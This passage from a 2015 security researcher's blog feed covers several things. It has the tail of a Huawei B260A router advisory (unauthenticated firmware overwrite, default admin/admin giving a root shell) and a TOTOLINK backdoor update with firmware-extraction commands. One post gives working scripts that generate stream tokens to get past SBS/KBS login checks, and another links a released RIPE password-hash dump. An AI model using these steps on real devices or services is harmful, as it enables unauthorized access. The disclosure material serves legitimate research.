root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
telnet: Unable to connect to remote host: Connection refused
root@linux:~
</code></pre>
<h2>Details - Firmware upload without authentication:</h2>
<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">The program (FMC tool) provided by Tunisia Telecom (from Huawei) to update the firmware sends udp packet to the broacast port 1280 udp</a>. The diag program running in the Huawei B260A replies by sending out information about the versions of the different components of the firmware. The updater tries to login using telnet (admin/admin) protocol to the modem in order to extract firmware versions (if the password is not admin, the update will continue and will work). Then the updater sends directly the files to the modem using 1280/tcp which will overwrite the MTD (Memory Technology Device, ie: flash storage) of the device without authentication:</p>
<p>By sniffing the packets:</p>
<p>1/ telnet connection from the official tool (with admin:admin credentials by default):</p>
<pre><code>HGW login: ......admin
Password: admin

No directory, logging in with HOME=/

BusyBox v0.60.0 (2013.02.20-03:27+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.
# nvram get cfe_version
# nvram get app_version
#
</code></pre>
<p>Even if the password is not 'admin', the updating process continues on port 1280/tcp.</p>
<p>2/ In the router, the diag program receives the data in port 1280/tcp, stores the data in files located in /tmp and then uses the <code>write</code> program in the router to overwrite the MTD.</p>
<p>No need to reverse, by using <code>top</code> in the router, we see the <code>write</code> process:</p>
<pre><code>1266 0         S    diagd 
1270 0         S    telnetd 
1822 0         R    write /tmp/uploadh1wNSR FWT  &lt;-- overwrites the MTD
</code></pre>
<p>write is a basic tool used to overwrite the mtdblock (<code>write /path/to/file device</code>, FWT for the MTD):</p>
<pre><code># write
usage: write [path] [device]
</code></pre>
<p>3/ After updating the firmware, you can login as admin/admin using the HTTP control panel and using telnet, allowing you to get a root shell.</p>
<p>This is a default behavior, as stated in the official documentation from the FMC tool:</p>
<pre><code>With this software, you can upgrade the Huawei FMC products in a very simple way.
This software supports the upgrade of five sub-modules, including BOOT of the router module,
APP of the router module, customized files of the router module, the wireless module,
and the dashboard software.
</code></pre>
<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">You can get the last firmware updater at this address</a></p>
<p>(Linux: <code>wget --user-agent="Mozilla" http://media.orange.tn/executable/maj_flyboxB260A.exe</code>)</p>
<p>Huawei doesn't provide directly firmwares for these devices, you have to download them from your ISP.</p>
<p>These ISPs use this router (from <a href="http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a">http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a</a> ):</p>
<ul>
<li>Argentina Claro</li>
<li>Argentina Movistar</li>
<li>Armenia Orange</li>
<li>Austria H3G</li>
<li>Austria Mobilkom</li>
<li>Brazil VIVO</li>
<li>Brazil CTBC</li>
<li>Jamaica C&amp;W JAMAICA</li>
<li>CTBC Brazil</li>
<li>Chile Entel</li>
<li>Croatia Vipnet</li>
<li>Danmark Hi3G</li>
<li>Ecuador CNT</li>
<li>Estonia Elisa Eesti</li>
<li>Germany E-Plus</li>
<li>Guatemala Tigo</li>
<li>JAMAICA C&amp;W</li>
<li>Jamaica Digicel</li>
<li>Kenya Orange</li>
<li>Mali Orange</li>
<li>Mexico Telcel</li>
<li>Niger Orange</li>
<li>Portugal Optimus</li>
<li>Portugal VDF</li>
<li>Roumania Vodafone</li>
<li>Slovak Telekom</li>
<li>Slovak Orange</li>
<li>Sweden HI3G</li>
<li>Sweden TELE2</li>
<li>Sweden Tele2</li>
<li>Tele2 Germany</li>
<li>Telia Sweden</li>
<li>Tunisia Orange</li>
</ul>
<p>From my research, it is possible to overwrite the default firmware with a custom one without authentication.</p>
<p>It is also possible to sim-unlock the device by sending packets to port 1280/udp.</p>
<p>As stated before, this firmware seems to be used for the below devices, so the devices are likely to be vulnerable to the same threats:</p>
<ul>
<li>E960, WLA1GCPU</li>
<li>E968, WLA1GCYU</li>
<li>B970, WLA1GAPU</li>
<li>B932, WLB1TIPU</li>
<li>B933, WLB1TIPU</li>
<li>B220, WLA1GCYU</li>
<li>B260, WLA1GCYU</li>
<li>B270, WLA1GCYU</li>
<li>B972, WLA1GCYU</li>
<li>B200-20, WLB3TILU</li>
<li>B200-30, WLB3TILU</li>
<li>B200-40, WLB3TILU</li>
<li>B200-50, WLB3TILU</li>
<li>??, WLA1GCPU</li>
</ul>
<h2>Vendor Response</h2>
<p>The vulnerable routers are in the End Of Service cycle and will not be supported anymore.</p>
<p>The vendor encourages people to discard existing unsupported models and to use new routers (B68L and B310).</p>
<p><a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-notices/hw-456466.htm">Official Huawei Security Notice</a></p>
<h2>Report Timeline</h2>
<ul>
<li>Aug 21, 2014: Vulnerabilities found by Pierre Kim.</li>
<li>Aug 24, 2015: Huawei PSIRT is notified of the vulnerabilities.</li>
<li>Aug 25, 2015: Huawei PSIRT confirms the notification.</li>
<li>Aug 28, 2015: Huawei PSIRT confirms the vulnerabilities affecting the B260a router. The B260a router is in the End Of Service cycle and Huawei would not support B260a or provide fixed version or patch. The B68L and B310, as a substitute for B260a, are not vulnerable for the issues mentioned above and welcome to use.</li>
<li>Aug 31, 2015: Pierre Kim asks if the other routers (E960, E968, B970, B932, B933, B220, B260, B270, B972, B200-20, B200-30, B200-40, B200-50) are vulnerable.</li>
<li>Sep 14, 2015: Huawei PSIRT confirms all the routers have been in the End Of Service cycle.</li>
<li>Sep 29, 2015: Huawei PSIRT asks to be notified when the advisory is posted.</li>
<li>Oct 05, 2015: Pierre Kim asks for a CNNVD entry.</li>
<li>Oct 05, 2015: Pierre Kim indicated he will release the advisory the Oct 07, 2015.</li>
<li>Oct 07, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (@PierreKimSec).</p>
<h2>Greetings</h2>
<p>Big thanks to my friend Alexandre Torres.</p>
<h2>References</h2>
<p>https://pierrekim.github.io/advisories/2015-huawei-0x00.txt</p>
<p>https://pierrekim.github.io/blog/2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html</p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
    </entry>
    
    <entry>
        <title>TOTOLINK Update - How to NOT handle security issues</title>
        <link href="2015-08-13-TOTOLINK-how-to-NOT-handle-security-issues.html"/>
        <content type="html"><p>This post is an an update to:</p>
<ul>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/80">Backdoor and RCE found in 8 TOTOLINK router models</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/79">Backdoor credentials found in 4 TOTOLINK router models</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/78">4 TOTOLINK router models vulnerable to CSRF and XSS attacks</a></li>
<li><a href="http://seclists.org/fulldisclosure/2015/Jul/77">15 TOTOLINK router models vulnerable to multiple RCEs</a></li>
</ul>
<p>Totolink has released new firmwares on 2015-07-25 and also removed the old firmwares from their website.</p>
<p>The backdoor is still present in the new firmware images but it is not launched at the startup anymore.</p>
<p>You can check yourself by downloading the images and by using binwalk:</p>
<h2>Example with N300RH-V2:</h2>
<pre><code>$ wget -O 'TOTOLINK%20N300RH-V2.0.1_20150725.zip' 'http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V2.0.1_20150725.zip'
$ 7z x TOTOLINK%20N300RH-V2.0.1_20150725.zip
[...]
$ binwalk -e *web
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16            0x10            bzip2 compressed data, block size = 900k
309403        0x4B89B         LZMA compressed data, properties: 0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
320182        0x4E2B6         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3414764 bytes
1274560       0x1372C0        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2251972 bytes,  321 inodes, blocksize: 131072 bytes, created: Thu May  4 11:47:12 2006
$ cd _*/
$ 7z x *squashfs
Processing archive: 1372C0.squashfs

Extracting  bin
Extracting  dev
[...]
Everything is Ok
$ strings bin/skt | grep iptables
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
$ tail -n 5 etc/init.d/rcS

# start web server
boa
#skt&amp;
</code></pre>
<p>They commented the <code>skt&amp;</code> execution in the <em>/etc/init.d/rcS</em>. The bin/skt backdoor is still there but not activated.
I encourage TOTOLINK users to audit next firmwares to make sure the backdoor is not reactivated by "error".</p>
<p>There are no security indications in the <a href="http://www.totolink.net/sub/news/board_content.asp?b_type=BOARD1&amp;idx=164">"Firmware Update Release Information"</a> and I don't want to waste my time to check if they patched the other security holes (RCE, XSS, CSRF ...) described here:</p>
<ul>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html">https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html">https://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html">https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html</a></li>
<li><a href="https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html">https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html</a></li>
</ul>
<h2>Totolink statement</h2>
<p>By the way, Totolink released a <a href="http://www.totolink.net/sub/news/board_content.asp?b_type=BOARD1&amp;idx=165">statement the 2015-07-30 saying that there are no backdoors in their routers and threatened to sue medias regarding "totally irresponsible behavior", stating my research contains "some unverified information"</a>:</p>
<pre><code> ZIONCOM (HK) Technology Ltd (ZIONCOM, the manufacturer of TOTOLINK Router), would like to make an
 official announcement regarding some inappropriately news report from network media that were totally
 irresponsible behavior for reporting some unverified information to damage our company reputation.

 1. TOTOLINK do not compromise user privacy and security, TOTOLINK
 product has not been installed any monitor software on user behavior after we verified all of our
 current inventory in Hong Kong market so it is impossible to monitor user behavior. ZIONCOM will
 reserve the right to take legal action against the media report on the wrong information broadcasting
 that may damage our company and product reputations.

 2. Regarding the problem of a default login password of a TOTOLINK
 router may trigger an invasion from hacker through remote control, we would like to recommend all users
 to change the default password at the first time login.We will make an announcement through our Global
 website ( http://www.totolink.net )  for launching new firmware update program for solving the bug soon.
</code></pre>
<p><strong>Note that some firmwares have apparently not been correctly updated.</strong></p>
<p>For example, the "this-is-a-feature-not-a-backdoor-executable" is <a href="http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V3.0.0_20150331.zip"><strong>still activated</strong> in the latest N300RH-V3 firmware router (from the N300RH webpage)</a>.</p>
<p>You can check by yourself the "unverified information" by using the precedent commands: the file <em>/etc/init.d/rcS</em> still contains <code>skt&amp;</code> to execute the "this-is-a-feature-not-a-backdoor-executable" <code>/bin/skt</code> at startup):</p>
<pre><code>$ wget -O TOTOLINK%20N300RH-V3.0.0_20150331.zip 'http://www.totolink.net/include/download.asp?path=down/010500&amp;file=TOTOLINK%20N300RH-V3.0.0_20150331.zip'
$ sha256sum TOTOLINK%20N300RH-V3.0.0_20150331.zip 
3c12a38dfc8c72733f384ba206e9b21a37614ba77aba7f3433ed1ce9bd40cda4  TOTOLINK%20N300RH-V3.0.0_20150331.zip
$ 7z x TOTOLINK%20N300RH-V3.0.0_20150331.zip
[...]
Everything is Ok
$ binwalk -e *web
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16            0x10            bzip2 compressed data, block size = 900k
307237        0x4B025         LZMA compressed data, properties: 0x88, dictionary size: 1048576 bytes, uncompressed size: 65535 bytes
317016        0x4D658         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3666608 bytes
1337954       0x146A62        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2169904 bytes,  580 inodes, blocksize: 131072 bytes, created: Wed Feb 10 00:30:40 2038
$ cd _*/
$ 7z x *squashfs
Extracting  bin
Extracting  dev
[...]
Everything is Ok
$ strings bin/skt | grep iptables
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
$ tail -n 5 etc/init.d/rcS

# start web server
boa
skt&amp;                                                  &lt;-- backdoor is launched at startup
</code></pre>
<p>I leave security researchers, totolink users and medias to use their own judgment and draw a conclusion about this case.</p>
<p>Regards,</p></content>
    </entry>
    
    <entry>
        <title>Watching SBS and KBS in a remote country</title>
        <link href="2015-08-10-watching-SBS-and-KBS-in-a-remote-country.html"/>
        <content type="html"><p>SBS and KBS are Korean TV networks and they provide TV streaming, but they are using fancy flash players (hello 100% used CPU) and SBS even asks a passport for foreigners to get access to the streams. Koreans can have access after being authentified to their services.</p>
<p>As I have a personal fight to provide access to K-POP for EVERYBODY and because I have to travel to different countries, I've prepared this article that will explain how to watch SBS, KBS1 and KBS2 without authentication.</p>
<p>The <a href="https://en.wikipedia.org/wiki/Real_Time_Messaging_Protocol">RTMP</a> streams are protected using tokens.</p>
<p>A working RTMP request, with the one-time-token:
<img alt="" src="images/sbs-wireshark.png" /></p>
<p>By sniffing the traffic and decompiling the SWFs file, I discovered how to easily generate tokens:</p>
<p>The SWF in SBS website forces the browser to get a token by connecting to API (SBS). The SWFs in KBS* websites get the token directly in the webpage.</p>
<h2>Watching SBS:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' \
  'http://api.sbs.co.kr/vod/_v1/Onair_Media_Auth.jsp?playerType=flash&amp;channelPath=sbsch6pc&amp;streamName=sbs1ch63.stream' | sed -e 's/\(.*\)q=\(.*\)/\2/'
TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTO%3D%3D
</code></pre>
<p>This script will allows you to watch SBS:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' \
  'http://api.sbs.co.kr/vod/_v1/Onair_Media_Auth.jsp?playerType=flash&amp;channelPath=sbsch6pc&amp;streamName=sbs1ch63.stream' | sed -e 's/\(.*\)q=\(.*\)/\2/')
rtmpdump --resume -r "rtmp://nlive.sbs.co.kr/sbsch6pc/sbs1ch63.stream?u=sbs&amp;type=asp&amp;q=${token}" \
  --app "sbsch6pc?u=sbs&amp;type=asp&amp;q=${X}" --flashVer 'MAC 18,0,0,209' \
  -s 'http://vod.sbs.co.kr/onair/NeTVOnAir_1_4_2.swf?dd=9' \
  -t "rtmp://nlive.sbs.co.kr/sbsch6pc?u=sbs&amp;type=asp&amp;q=${X}" \
  -p 'http://vod.sbs.co.kr/onair/onair_index.jsp?Channem=SBS&amp;div=pc_onair' \
  -y "sbs1ch63.stream" | mplayer -
</code></pre>
<h2>Watching KBS1:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//'
1tv_home.stream?id=2101&amp;si=9&amp;secure=TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENT==&amp;csu=false
</code></pre>
<p>Now using this token is easy.
This script will allows you to watch KBS1:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//')
rtmpdump --resume -r "rtmp://live2.kbs.gscdn.com/1tv_home/_definst_/${token}" \
  --flashVer 'MAC 18,0,0,209' | mplayer -
</code></pre>
<h2>Watching KBS2:</h2>
<p>Sending this wget request will provide you the valid secure token:</p>
<pre><code>wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//'
1tv_home.stream?id=2101&amp;si=9&amp;secure=TOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENTOKENT==&amp;csu=false
</code></pre>
<p>Now using this token is easy.
This script will allows you to watch KBS2:</p>
<pre><code>#!/bin/sh

token=$(wget -qO- --user-agent='YOUR_USER_AGENT' 'http://www.kbs.co.kr/player/player_playlist.php?ch=11' | awk '/movieListVstream/{ print $4 }' | sed -e 's/\["//;s/"\];//')
rtmpdump --resume -r "rtmp://live2.kbs.gscdn.com/2tv_home/_definst_/${token}" \
  --flashVer 'MAC 18,0,0,209' | mplayer -
</code></pre>
<p>Now, Enjoy K-POP while finding 0days ~~~~~~~~~~~~</p></content>
    </entry>
    
    <entry>
        <title>updated - 172 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request</title>
        <link href="2015-07-27-172-iptime-router-models-unauthenticated-RCE-with-DHCP-updated.html"/>
        <content type="html"><p><a href="http://www.cnet.co.kr/view/100140730">ipTIME responded to CNET Korea about the DHCP RCE on 2015-07-22</a> - <a href="http://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html">Original advisory</a>.</p>
<p>ipTIME released the 9.78 firmwares for 116 routers and finally credited my work. 172 products are affected in total and 9.72 firmwares will be released soon for all the router models to patch the security problem.</p>
<p>References:</p>
<ul>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16563&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16572&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16582&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16609&amp;mod=document">X</a></li>
<li><a href="http://iptime.com/iptime/?page_id=16&amp;uid=16678&amp;mod=document">X</a></li>
</ul></content>
    </entry>
    
    <entry>
        <title>Why Full Disclosure is the solution ? An example with RIPE</title>
        <link href="2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html"/>
        <content type="html"><p><strong>TL;DR: <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">hashes list from the RIPE database has been posted to MEGA, containing usable hashes from 2011 to July 2015.</a></strong></p>
<p>The human is reluctant to change. Full Disclosure is, sometimes, the only solution to improve Security by forcing the change.</p>
<p><a href="https://en.wikipedia.org/wiki/RIPE">RIPE, Reseau IP Europeen, is in charge of IP allowance in Europe</a>.</p>
<p>In 2011, I had grabbed all the authentication MD5s of the RIPE  database before
they  were taken out from the public view and RIPE asked people to change their passwords.
These MD5s were public-made available in WHOIS reponses for years.</p>
<p>I don't think I was the only security researcher who downloaded all the hashes. Clearly, there were a lot of people who had this database.
The 36.000 hashes stayed in my hard disk for 4 years.</p>
<p>Finding them again in 2015 in my $HOME, some may have wanted to deface the WHOIS RIPE database by inserting giant ASCII penises everywhere and changing IP attributions. Instead, I contacted the RIPE NCC Information Security Officer and then the RIPE Database Working Group Members, hoping to have open discussions and find a solution:</p>
<ul>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html">[db-wg] MD5s of the RIPE database, Deprecation of MD5 and safe authentication methods</a></li>
</ul>
<p>As I said in the first email:</p>
<pre><code>According to the RIPE transparency, as recommended by RIPE NCC
Security, therefore I am now contacting this working group to work
together because deprecation of MD5 is an important change in the RIPE
database and it must be debated in a democratic manner.

This john-compatible file (containing MNT logins and MD5 hashs) was
never exposed to public but the  hashes  can  be  (VERY) easily
cracked. From the discussion with RIPE Security (who received a copy
of this file), 27.000 usable hashes (on a total of 36.000) appeared to
be valid til now.

When I discussed it with RIPE NCC Security, I gave a 90 day disclosure
policy about this "public" information, starting from the 16 Apr 2015.
The 90 day period can be adjusted by adding more days at the end if
RIPE shows a good progress of the migration. I wanted to do
responsible disclosure when I saw the RIPE Responsible Disclosure
Policy which is a Really Good Thing, I think.

My analysis is simple: The MD5 authentication is broken for years and
it's time to change to a more secure method. I think people needs to
be encouraged to move to SSO authentication. Using MD5 now is unsafe
and dangerous, especially with unchanged 4 year-old passwords.

Please share your thoughts about this situation. I will be happy to
debate with you.
</code></pre>
<p>After a debate with the RIPE working group about the impact of the fact 27.000 hashes were still usable (75% of total valid hashes 36.000) and  MD5 is prone to collision attacks, and
the ethics in releasing this information, which was not the point, I think, RIPE changed the affected passwords and encouraged stronger authentication methods.</p>
<p>You can read all the posts in the RIPE public mailing list, database working group archives:</p>
<ul>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html">https://www.ripe.net/ripe/mail/archives/db-wg/2015-May/004554.html</a></li>
<li><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-June/004665.html">https://www.ripe.net/ripe/mail/archives/db-wg/2015-June/004665.html</a></li>
</ul>
<p><a href="https://www.ripe.net/ripe/mail/archives/db-wg/2015-July/004709.html">Now that all the hashes are invalid from July 2015</a>, <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">I am releasing the database</a>. These informations were PUBLIC before 2011.
Releasing the hashes is still subject to ethical problems. The release is expected to allow people to study the strengh of the hashes. Again, the hashes (and the decrypted passwords) are now UNUSABLE to anyone.</p>
<p>I want to thank all the RIPE participants in the Database Working Group for exchanging their opinions about this problem, especialy Tim Bruijnzeels and Ivo Dijkhuis, from RIPE. Even if, sometimes, we didn't share the same ideas, the debate was democractic allowing people to share their visions of improving security in RIPE. I really think RIPE managed this problem in an effective manner, improving the security of their IT infrastructure.</p>
<p>RIPE has a blogpost explaing how to migrate to a safer authentication method here:</p>
<ul>
<li><a href="https://labs.ripe.net/Members/AlexBand/pgp-in-the-ripe-database">https://labs.ripe.net/Members/AlexBand/pgp-in-the-ripe-database</a></li>
</ul>
<h2>Now, a small personal analysis:</h2>
<p>In Twitter, Blogs and vulnerability reports, we are speaking about 0days and new exploitation techniques: I consider it's very important.</p>
<p>But I really think too there is a big gap between the research in security and the reality. Companies are mainly hacked using word macros and lazy sysadmins.</p>
<p>It is a VERY bad sign in IT Security that:</p>
<ul>
<li>75% of the passwords in RIPE were not changed for 4 years and these concern mainly IT professional accounts, even though RIPE alerted them to change the passwords since 2011</li>
<li>We still find reluctant opinions to challenge the current situation and make necessary actions in improving IT security.</li>
</ul>
<p>Mentality needs to change. Apparently, for some people, this disclosure of information is unethical. This was not the problem of ethics but protection of private information. A lot of people had the RIPE credentials in their hands and something needs to be done.</p>
<p>So now, enjoy the show. <a href="https://mega.co.nz/#!xMIxHZCT!EgWNb65ERsTf5URgBNq8VW_flzXSNbO3URwE0nqtsXY">The hashes list, as a john-compatible file, is available at MEGA</a>.</p>
<p>Note: this email has been sent to Full-Disclosure and has been blogposted to: <a href="https://pierrekim.github.io/blog/2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html">https://pierrekim.github.io/blog/2015-07-22-why-full-disclosure-is-the-solution-an-examble-with-ripe.html</a>.</p>
<p>Regards,</p></content>
    </entry>
    
    <entry>
        <title>Using Linux (Debian 8) on a LG 13ZD950</title>
        <link href="2015-07-22-using-linux-on-a-lg-13zd950.html"/>
        <content type="html"><p>The <a href="http://search.daum.net/search?q=LG+13ZD950">LG 13ZD950</a> is a very light laptop (980g). It's the new version of the LG 13ZD940.
Currently this laptop can be bought in South Korea.
There are a lot of different models.  Mine is equiped with a i3-5005U CPU, 8GB DDR3L and a 128GB SSD.
Debian 8 doesn't fully support Broadwell graphics but the backports can fix this.
In short, everything works well using backports.
  <img alt="" src="images/lg-13zd950.jpg" /></p>
<h2>Display:</h2>
<pre><code>$ xrandr
Screen 0: minimum 8 x 8, current 1920 x 1080, maximum 32767 x 32767
eDP1 connected primary 1920x1080+0+0 (normal left inverted right x axis y axis) 293mm x 165mm
1920x1080     60.02*+  59.93
1680x1050     59.95    59.88
1600x1024     60.17
1400x1050     59.98
1280x1024     60.02
1440x900      59.89
1280x960      60.00
1360x768      59.80    59.96
1152x864      60.00
1024x768      60.00
800x600       60.32    56.25
640x480       59.94
HDMI1 disconnected (normal left inverted right x axis y axis)
VIRTUAL1 disconnected (normal left inverted right x axis y axis)
</code></pre>
<p>Before installing drivers for HD5500:</p>
<pre><code>$ glxinfo | grep OpenGL
OpenGL vendor string: VMware, Inc.
OpenGL renderer string: Gallium 0.4 on llvmpipe (LLVM 3.5, 256 bits)
OpenGL version string: 3.0 Mesa 10.3.2
OpenGL shading language version string: 1.30
OpenGL context flags: (none)
OpenGL extensions:
</code></pre>
<p>After:</p>
<pre><code>$ glxinfo | grep OpenGL
OpenGL vendor string: Intel Open Source Technology Center
OpenGL renderer string: Mesa DRI Intel(R) HD Graphics 5500 (Broadwell GT2)
OpenGL core profile version string: 3.3 (Core Profile) Mesa 10.3.2
OpenGL core profile shading language version string: 3.30
OpenGL core profile context flags: (none)
OpenGL core profile profile mask: core profile
OpenGL core profile extensions:
OpenGL version string: 3.0 Mesa 10.3.2
OpenGL shading language version string: 1.30
OpenGL context flags: (none)
OpenGL extensions:
OpenGL ES profile version string: OpenGL ES 3.0 Mesa 10.3.2
OpenGL ES profile shading language version string: OpenGL ES GLSL ES 3.0
OpenGL ES profile extensions:
</code></pre>
<p>Installing HD5500 drivers:</p>
<p>Add this to /etc/apt/sources.list:</p>
<pre><code>deb http://http.debian.net/debian jessie-backports main
</code></pre>
<p>Then</p>
<pre><code># apt-get update
# apt-get -t jessie-backports install xserver-xorg-video-intel
</code></pre>
<h2>SSD:</h2>
<p>from S.M.A.R.T.:</p>
<pre><code>=== START OF INFORMATION SECTION ===
Device Model:     HFS128G36MNB-2300A
Serial Number:    XXXXXXXXXXXXXXXXX
Firmware Version: 10105L00
User Capacity:    128,035,676,160 bytes [128 GB]
Sector Size:      512 bytes logical/physical
Rotation Rate:    Solid State Device
Device is:        Not in smartctl database [for details use: -P showall]
ATA Version is:   ATA8-ACS (minor revision not indicated)
SATA Version is:  SATA 3.1, 6.0 Gb/s (current: 6.0 Gb/s)
SMART support is: Available - device has SMART capability.
SMART support is: Enabled
</code></pre>
<p>Benchmarking:</p>
<pre><code># hdparm -tT /dev/sda

/dev/sda:
Timing cached reads:   6924 MB in  2.00 seconds = 3463.82 MB/sec
Timing buffered disk reads: 1380 MB in  3.00 seconds = 459.29 MB/sec
</code></pre>
<p>460MB/sec in reading mode is quite good.</p>
<h2>CPU:</h2>
<pre><code>Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                4
On-line CPU(s) list:   0-3
Thread(s) per core:    2
Core(s) per socket:    2
Socket(s):             1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 61
Model name:            Intel(R) Core(TM) i3-5005U CPU @ 2.00GHz
Stepping:              4
CPU MHz:               2000.000
CPU max MHz:           2000.0000
CPU min MHz:           500.0000
BogoMIPS:              3990.92
Virtualization:        VT-x
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              3072K
NUMA node0 CPU(s):     0-3
</code></pre>
<p>CPU Flags:</p>
<pre><code>flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc aperfmperf eagerfpu pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch ida arat epb xsaveopt pln pts dtherm tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap
</code></pre>
<h2>Encryption Benchmarking (grep -i aes /proc/cpuinfo):</h2>
<p>AES-128-CBC without AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128 cbc      79218.44k    87596.05k    89851.03k    90191.53k    88001.19k
</code></pre>
<p>AES-128-CBC with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
